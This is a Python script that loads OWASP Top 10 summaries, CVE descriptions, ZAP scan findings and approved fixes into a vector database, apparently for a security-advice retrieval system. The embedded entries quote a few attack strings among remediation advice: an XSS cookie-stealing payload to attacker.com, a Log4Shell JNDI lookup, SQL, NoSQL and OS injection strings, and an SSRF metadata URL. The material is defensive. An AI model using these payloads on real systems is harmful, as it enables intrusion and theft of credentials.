import psycopg2
import requests
import json
import os
import sys
from pathlib import Path
from sentence_transformers import SentenceTransformer
from dotenv import dotenv_values
from bs4 import BeautifulSoup

# ======================================================
# CONFIG
# ======================================================
config = dotenv_values(".env")

DB_CONFIG = {
    "host":     config.get("DB_HOST", "localhost"),
    "port":     config.get("DB_PORT", 5432),
    "dbname":   config.get("DB_NAME"),
    "user":     config.get("DB_USER"),
    "password": config.get("DB_PASSWORD"),
}

# Modèle d'embeddings léger et performant
print("📦 Loading embedding model...")
embedder = SentenceTransformer("all-MiniLM-L6-v2")  # 384 dimensions
print("✅ Model loaded")

# ======================================================
# HELPERS
# ======================================================
def get_conn():
    return psycopg2.connect(**DB_CONFIG)

def embed(text: str) -> list:
    return embedder.encode(text).tolist()

def insert_knowledge(conn, source, title, content, metadata={}):
    vector = embed(f"{title} {content}")
    with conn.cursor() as cur:
        cur.execute(
            """
            INSERT INTO knowledge_base (source, title, content, metadata, embedding)
            VALUES (%s, %s, %s, %s, %s::vector)
            ON CONFLICT DO NOTHING
            """,
            (source, title, content, json.dumps(metadata), vector)
        )
    conn.commit()
    return True

# ======================================================
# 1. OWASP TOP 10
# ======================================================
OWASP_TOP_10 = [
    {
        "id": "A01:2021",
        "title": "Broken Access Control",
        "content": """
Broken Access Control occurs when users can act outside their intended permissions.
Common vulnerabilities include: bypassing access control checks, elevation of privilege,
accessing other users' accounts, missing function level access control.

Attack scenarios:
- SQL injection in URL parameters to access unauthorized data
- Force browsing to /admin without authentication
- Modifying API requests to access other users' data

Remediation:
- Implement deny by default access control
- Use server-side access control checks
- Disable directory listing
- Log and alert on access control failures
- Rate limit API and controller access
- Invalidate JWT tokens after logout

CVSS typical range: 7.0-9.8 (High to Critical)
CWE: CWE-200, CWE-201, CWE-352
        """,
        "metadata": {"owasp_id": "A01:2021", "cwe": ["CWE-200", "CWE-352"]}
    },
    {
        "id": "A02:2021",
        "title": "Cryptographic Failures",
        "content": """
Cryptographic failures expose sensitive data due to weak or missing cryptography.
Includes: data transmitted in cleartext, weak cryptographic algorithms, improper
key management, missing encryption at rest.

Attack scenarios:
- Intercepting HTTP traffic with sensitive data in cleartext
- Cracking MD5/SHA1 password hashes from leaked database
- Downgrade attacks forcing weak TLS versions

Remediation:
- Classify data processed and stored by sensitivity
- Don't store sensitive data unnecessarily
- Encrypt all sensitive data at rest using AES-256
- Use strong protocols: TLS 1.2+ only
- Use bcrypt, scrypt, Argon2 for password hashing
- Disable deprecated cryptographic functions

CVSS typical range: 5.0-8.0 (Medium to High)
CWE: CWE-259, CWE-327, CWE-331
        """,
        "metadata": {"owasp_id": "A02:2021", "cwe": ["CWE-259", "CWE-327"]}
    },
    {
        "id": "A03:2021",
        "title": "Injection",
        "content": """
Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.
Types: SQL, NoSQL, OS, LDAP injection, XSS, SSTI.

Attack scenarios:
- SQL: ' OR '1'='1 bypasses authentication
- NoSQL: {"$gt": ""} bypasses MongoDB queries
- OS injection: ; cat /etc/passwd appended to system calls
- XSS: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>

Remediation:
- Use parameterized queries / prepared statements
- Use ORM frameworks correctly
- Validate and sanitize all inputs server-side
- Escape special characters
- Use stored procedures
- Implement WAF rules
- SAST/DAST scanning in CI/CD pipeline

CVSS typical range: 6.0-10.0 (Medium to Critical)
CWE: CWE-89, CWE-79, CWE-78
        """,
        "metadata": {"owasp_id": "A03:2021", "cwe": ["CWE-89", "CWE-79", "CWE-78"]}
    },
    {
        "id": "A04:2021",
        "title": "Insecure Design",
        "content": """
Insecure design refers to missing or ineffective security controls in the design phase.
Includes: missing threat modeling, insecure business logic, lack of security patterns.

Attack scenarios:
- Password reset via security questions (easily guessable)
- Mass account enumeration through login error messages
- Credential stuffing due to lack of rate limiting

Remediation:
- Establish secure development lifecycle
- Use threat modeling for critical flows
- Integrate security patterns in design
- Implement rate limiting on all APIs
- Use generic error messages
- Segregate tenant data by design

CVSS typical range: 4.0-7.5 (Medium to High)
CWE: CWE-73, CWE-183, CWE-209
        """,
        "metadata": {"owasp_id": "A04:2021", "cwe": ["CWE-209"]}
    },
    {
        "id": "A05:2021",
        "title": "Security Misconfiguration",
        "content": """
Security misconfiguration is the most commonly seen issue. Includes: default credentials,
unnecessary features enabled, verbose error messages, missing security headers,
unpatched systems.

Attack scenarios:
- Default admin/admin credentials on admin panel
- Directory listing enabled exposing file structure
- Detailed error messages revealing stack traces
- Missing security headers (HSTS, CSP, X-Frame-Options)
- S3 buckets publicly accessible

Remediation:
- Automated configuration verification
- Remove unused features and frameworks
- Review and update configurations
- Implement security headers
- Send security directives to clients
- Segment application architecture

CVSS typical range: 3.0-7.5 (Low to High)
CWE: CWE-16, CWE-611
        """,
        "metadata": {"owasp_id": "A05:2021", "cwe": ["CWE-16"]}
    },
    {
        "id": "A06:2021",
        "title": "Vulnerable and Outdated Components",
        "content": """
Components with known vulnerabilities include: outdated libraries, frameworks, OS,
unpatched software, unsupported components.

Attack scenarios:
- Log4Shell (CVE-2021-44228) in outdated Log4j
- Heartbleed in old OpenSSL versions
- Struts vulnerability exploited in Equifax breach

Remediation:
- Continuously inventory component versions
- Monitor CVE/NVD for vulnerabilities
- Automate dependency scanning (Dependabot, Snyk)
- Remove unused dependencies
- Obtain components from official sources over secure links
- Prefer signed packages

CVSS typical range: 5.0-10.0 (Medium to Critical)
CWE: CWE-1104
        """,
        "metadata": {"owasp_id": "A06:2021", "cwe": ["CWE-1104"]}
    },
    {
        "id": "A07:2021",
        "title": "Identification and Authentication Failures",
        "content": """
Authentication failures allow attackers to compromise passwords, keys, or session tokens.
Includes: weak passwords, credential stuffing, brute force, missing MFA, session fixation.

Attack scenarios:
- Credential stuffing using known username/password lists
- Brute force on /login without rate limiting
- Session token exposed in URL
- Predictable session IDs

Remediation:
- Implement MFA where possible
- Enforce strong password policies
- Implement rate limiting and lockout
- Use secure session management (random, long tokens)
- Invalidate sessions on logout
- Use bcrypt for password storage

CVSS typical range: 5.0-9.0 (Medium to Critical)
CWE: CWE-297, CWE-287, CWE-384
        """,
        "metadata": {"owasp_id": "A07:2021", "cwe": ["CWE-287", "CWE-384"]}
    },
    {
        "id": "A08:2021",
        "title": "Software and Data Integrity Failures",
        "content": """
Integrity failures relate to code and infrastructure that does not protect against
integrity violations. Includes: insecure deserialization, unsigned updates, CI/CD pipeline
without integrity checks.

Attack scenarios:
- Malicious npm package injected in supply chain
- Deserialization attack via crafted Java object
- Auto-update mechanism without signature verification

Remediation:
- Use digital signatures to verify software/data
- Ensure dependencies from trusted repositories
- Review code changes and configurations
- Ensure CI/CD pipeline has proper segregation
- Do not send unsigned serialized objects to clients
- Implement integrity checks or digital signatures

CVSS typical range: 5.0-9.0 (Medium to Critical)
CWE: CWE-502, CWE-345
        """,
        "metadata": {"owasp_id": "A08:2021", "cwe": ["CWE-502"]}
    },
    {
        "id": "A09:2021",
        "title": "Security Logging and Monitoring Failures",
        "content": """
Insufficient logging and monitoring allows attackers to persist and pivot undetected.
Includes: missing audit logs, unmonitored logs, unclear log messages, no alerting.

Attack scenarios:
- Brute force attack not detected due to missing login failure logs
- Data exfiltration not detected for weeks
- Malware installed without triggering alerts

Remediation:
- Ensure all login, access control, server-side validation failures are logged
- Log format suitable for log management solutions
- High-value transactions have audit trail
- Establish effective monitoring and alerting
- Establish incident response and recovery plan
- Use SIEM solutions

CVSS typical range: 4.0-7.0 (Medium to High)
CWE: CWE-778, CWE-117
        """,
        "metadata": {"owasp_id": "A09:2021", "cwe": ["CWE-778"]}
    },
    {
        "id": "A10:2021",
        "title": "Server-Side Request Forgery",
        "content": """
SSRF flaws occur when a web app fetches a remote resource without validating the URL.
Allows attackers to coerce the application to send crafted requests to unexpected destinations.

Attack scenarios:
- Port scanning internal network via SSRF
- Accessing AWS metadata endpoint: http://169.254.169.254/
- Reading internal files via file:// protocol
- Bypassing IP allowlists

Remediation:
- Sanitize and validate all client-supplied input data
- Enforce URL schema, port, and destination with allowlist
- Disable HTTP redirections
- Do not send raw responses to clients
- Use network layer controls (firewall, VPN)
- Log all SSRF attempts

CVSS typical range: 6.0-9.8 (Medium to Critical)
CWE: CWE-918
        """,
        "metadata": {"owasp_id": "A10:2021", "cwe": ["CWE-918"]}
    },
]

def load_owasp(conn):
    print("\n📚 Loading OWASP Top 10...")
    count = 0
    for item in OWASP_TOP_10:
        insert_knowledge(
            conn,
            source="owasp",
            title=f"{item['id']} - {item['title']}",
            content=item["content"],
            metadata=item["metadata"]
        )
        count += 1
        print(f"  ✅ {item['id']} - {item['title']}")
    print(f"✅ OWASP: {count} entries loaded")

# ======================================================
# 2. CVE/NVD (Top vulnérabilités web)
# ======================================================
CVE_ENTRIES = [
    {
        "cve_id": "CVE-2021-44228",
        "title": "Log4Shell - Apache Log4j Remote Code Execution",
        "content": """
Critical RCE vulnerability in Apache Log4j2 library. CVSS Score: 10.0 (Critical).
Affected versions: Log4j2 2.0-beta9 to 2.14.1.

Description: JNDI features used in configuration, log messages, and parameters do not
protect against attacker controlled LDAP and other JNDI related endpoints.

Attack vector: ${jndi:ldap://attacker.com/exploit} in any logged field (User-Agent, headers, params)

Impact: Remote Code Execution, full system compromise, data exfiltration.

Remediation:
- Upgrade to Log4j 2.17.1+ immediately
- Set log4j2.formatMsgNoLookups=true
- Remove JndiLookup class from classpath
- Use WAF rules to block JNDI lookup patterns
        """,
        "metadata": {"cvss": 10.0, "severity": "Critical", "cwe": "CWE-917"}
    },
    {
        "cve_id": "CVE-2017-5638",
        "title": "Apache Struts2 Remote Code Execution",
        "content": """
Critical RCE in Apache Struts2 Content-Type header parsing. CVSS: 10.0 (Critical).
Used in Equifax breach affecting 147 million people.

Attack vector: Malicious Content-Type header triggers OGNL injection.

Impact: Remote code execution, complete system compromise.

Remediation:
- Upgrade Struts to 2.3.32 or 2.5.10.1+
- Implement WAF to filter malicious Content-Type
- Apply Struts security patches immediately
        """,
        "metadata": {"cvss": 10.0, "severity": "Critical", "cwe": "CWE-20"}
    },
    {
        "cve_id": "CVE-2019-0708",
        "title": "BlueKeep - Windows RDP Remote Code Execution",
        "content": """
Wormable RCE vulnerability in Windows Remote Desktop Services. CVSS: 9.8 (Critical).

Attack vector: Unauthenticated RDP connection with specially crafted request.

Impact: Remote code execution without user interaction, wormable.

Remediation:
- Apply MS19-0708 security patch
- Disable RDP if not needed
- Enable Network Level Authentication
- Block RDP port 3389 from internet
        """,
        "metadata": {"cvss": 9.8, "severity": "Critical", "cwe": "CWE-416"}
    },
    {
        "cve_id": "CVE-2021-26855",
        "title": "Microsoft Exchange Server SSRF",
        "content": """
SSRF vulnerability in Microsoft Exchange Server. CVSS: 9.1 (Critical).
Part of ProxyLogon exploit chain.

Attack vector: Unauthenticated HTTP request to Exchange server port 443.

Impact: Authentication bypass, access to email data, RCE when chained.

Remediation:
- Apply KB5000871 security update
- Run Microsoft Safety Scanner
- Review Exchange server logs for IOCs
        """,
        "metadata": {"cvss": 9.1, "severity": "Critical", "cwe": "CWE-918"}
    },
    {
        "cve_id": "CVE-2020-1472",
        "title": "Zerologon - Netlogon Elevation of Privilege",
        "content": """
Critical privilege escalation in Windows Netlogon. CVSS: 10.0 (Critical).

Attack vector: Unauthenticated attacker with network access to domain controller.

Impact: Complete domain compromise, domain admin privileges.

Remediation:
- Apply August 2020 Windows security updates
- Enable enforcement mode for Netlogon
- Monitor for CVE-2020-1472 exploitation attempts
        """,
        "metadata": {"cvss": 10.0, "severity": "Critical", "cwe": "CWE-330"}
    },
]

def load_cve(conn):
    print("\n🔴 Loading CVE entries...")
    count = 0
    for item in CVE_ENTRIES:
        insert_knowledge(
            conn,
            source="cve",
            title=f"{item['cve_id']} - {item['title']}",
            content=item["content"],
            metadata=item["metadata"]
        )
        count += 1
        print(f"  ✅ {item['cve_id']}")
    print(f"✅ CVE: {count} entries loaded")

# ======================================================
# 3. ZAP REPORTS (depuis DB)
# ======================================================
def load_zap_reports(conn):
    print("\n⚡ Loading ZAP reports from DB...")

    cur = conn.cursor()
    cur.execute("SELECT id, name, zap_report_path FROM products WHERE zap_report_path IS NOT NULL")
    products = cur.fetchall()

    if not products:
        print("  ⚠️  No ZAP reports found in DB")
        return

    # ← CORRECTION : chercher zapParser dans le bon dossier
    backend_path = Path(__file__).parent.parent / "backend"
    sys.path.insert(0, str(backend_path))

    try:
        from zapParser import parseZapHtmlFile
        print(f"  ✅ zapParser loaded from {backend_path}")
    except ImportError as e:
        print(f"  ⚠️  zapParser not found at {backend_path}: {e}")
        # Essayer chemin alternatif
        for alt_path in [
            Path(__file__).parent.parent,
            Path(__file__).parent,
            Path("../backend"),
            Path("./backend"),
        ]:
            sys.path.insert(0, str(alt_path))
            try:
                from zapParser import parseZapHtmlFile
                print(f"  ✅ zapParser found at {alt_path}")
                break
            except ImportError:
                continue
        else:
            print("  ❌ zapParser not found anywhere, skipping ZAP reports")
            return

    count = 0
    for product_id, product_name, zap_path in products:
        try:
            # Résoudre le chemin absolu
            if not os.path.isabs(zap_path):
                zap_path = str(Path(__file__).parent.parent / "backend" / zap_path)

            if not os.path.exists(zap_path):
                print(f"  ⚠️  File not found: {zap_path}")
                continue

            findings = parseZapHtmlFile(zap_path)
            for f in findings:
                content = f"""
ZAP Finding for product: {product_name}
Title: {f.get('title', '')}
URL: {f.get('url', '')}
Method: {f.get('method', '')}
Parameter: {f.get('parameter', '')}
Attack: {f.get('attack', '')}
Evidence: {f.get('evidence', '')}
Description: {f.get('description', '')}
Solution: {f.get('solution', '')}
Reference: {f.get('reference', '')}
CWE: {f.get('cwe', '')}
                """
                insert_knowledge(
                    conn,
                    source="zap_report",
                    title=f"ZAP: {f.get('title', 'Unknown')} - {product_name}",
                    content=content,
                    metadata={
                        "product_id": product_id,
                        "product_name": product_name,
                        "url": f.get("url", ""),
                        "severity": f.get("severity", ""),
                        "cwe": f.get("cwe", ""),
                    }
                )
                count += 1
            print(f"  ✅ {product_name}: {len(findings)} findings loaded")
        except Exception as e:
            print(f"  ⚠️  Error loading {product_name}: {e}")

    print(f"✅ ZAP Reports: {count} findings loaded")
# ======================================================
# 4. APPROVED RECOMMENDATIONS (depuis DB)
# ======================================================
def load_approved_recommendations(conn):
    print("\n✅ Loading approved recommendations from DB...")

    cur = conn.cursor()
    cur.execute("""
        SELECT
            r.id,
            r.content,
            r.cvss_score,
            r.priority,
            r.owasp_category,
            r.false_positive_likelihood,
            f.title,
            f.severity,
            f.scanner,
            p.name AS product_name
        FROM finding_recommendations r
        JOIN findings f ON f.id = r.finding_id
        JOIN products p ON p.id = f.product_id
        WHERE r.status = 'approved'
    """)
    rows = cur.fetchall()

    if not rows:
        print("  ⚠️  No approved recommendations found")
        return

    count = 0
    for row in rows:
        (rec_id, content, cvss_score, priority, owasp_cat,
         fp_likelihood, title, severity, scanner, product_name) = row

        knowledge_content = f"""
Approved security recommendation for: {product_name}
Vulnerability: {title}
Severity: {severity}
Scanner: {scanner}
CVSS Score: {cvss_score}
Priority: {priority}
OWASP Category: {owasp_cat}
False Positive Likelihood: {fp_likelihood}

Expert Recommendation (Human Approved):
{content}
        """
        insert_knowledge(
            conn,
            source="recommendation",
            title=f"Approved Fix: {title} ({product_name})",
            content=knowledge_content,
            metadata={
                "recommendation_id": str(rec_id),
                "severity": severity,
                "cvss_score": float(cvss_score) if cvss_score else None,
                "priority": priority,
                "product": product_name,
            }
        )
        count += 1

    print(f"✅ Recommendations: {count} entries loaded")

# ======================================================
# MAIN
# ======================================================
if __name__ == "__main__":
    print("🚀 Building Knowledge Base...")
    print("=" * 55)

    conn = get_conn()

    # Charger toutes les sources
    load_owasp(conn)
    load_cve(conn)
    load_zap_reports(conn)
    load_approved_recommendations(conn)

    # Stats finales
    cur = conn.cursor()
    cur.execute("SELECT source, COUNT(*) FROM knowledge_base GROUP BY source")
    stats = cur.fetchall()

    print("\n📊 Knowledge Base Stats:")
    print("=" * 55)
    total = 0
    for source, count in stats:
        print(f"  {source:<20} : {count} entries")
        total += count
    print(f"  {'TOTAL':<20} : {total} entries")
    print("=" * 55)

    conn.close()
    print("\n✅ Knowledge Base ready!")
    print("👉 Next: run rag.py to test retrieval")